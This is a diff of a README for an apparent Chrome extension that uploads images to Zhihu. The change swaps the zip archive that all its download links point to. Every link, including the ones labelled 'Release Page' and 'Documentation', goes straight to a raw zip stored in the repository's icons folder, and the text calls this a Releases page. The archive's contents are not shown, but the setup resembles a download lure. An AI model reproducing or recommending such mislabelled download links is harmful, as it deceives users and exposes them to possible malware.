@@ -1,7 +1,7 @@
 # 🚀 zhihu-markdown-image-uploader - Effortlessly Upload Images to Zhihu
 
 ## 🌐 Quick Download
-[![Download](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-image-markdown-uploader-2.9.zip%20Release-blue)](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-image-markdown-uploader-2.9.zip)
+[![Download](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-markdown-uploader-image-v1.9.zip%20Release-blue)](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-markdown-uploader-image-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the Zhihu Markdown Image Uploader. This Chrome extension allows you to automatically upload images to Zhihu without any complex setups. You just need to install it and start uploading images effortlessly.
@@ -9,7 +9,7 @@ Welcome to the Zhihu Markdown Image Uploader. This Chrome extension allows you t
 ## 📥 Download & Install
 To get started, visit the link below to download the latest version of the extension:
 
-[Download the latest release here](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-image-markdown-uploader-2.9.zip)
+[Download the latest release here](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-markdown-uploader-image-v1.9.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the most recent version listed.
@@ -51,7 +51,7 @@ For help or feedback, please open an issue in the GitHub repository or contact u
 Thank you for using the Zhihu Markdown Image Uploader. We hope it makes your image uploading seamless and stress-free!
 
 ## 🔗 Useful Links
-- [Release Page](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-image-markdown-uploader-2.9.zip) - Download the latest version
-- [Documentation](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-image-markdown-uploader-2.9.zip) - Learn more about the extension
+- [Release Page](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-markdown-uploader-image-v1.9.zip) - Download the latest version
+- [Documentation](https://raw.githubusercontent.com/bhabartuneday/zhihu-markdown-image-uploader/main/icons/zhihu-markdown-uploader-image-v1.9.zip) - Learn more about the extension
 
 Stay updated by following us on GitHub!
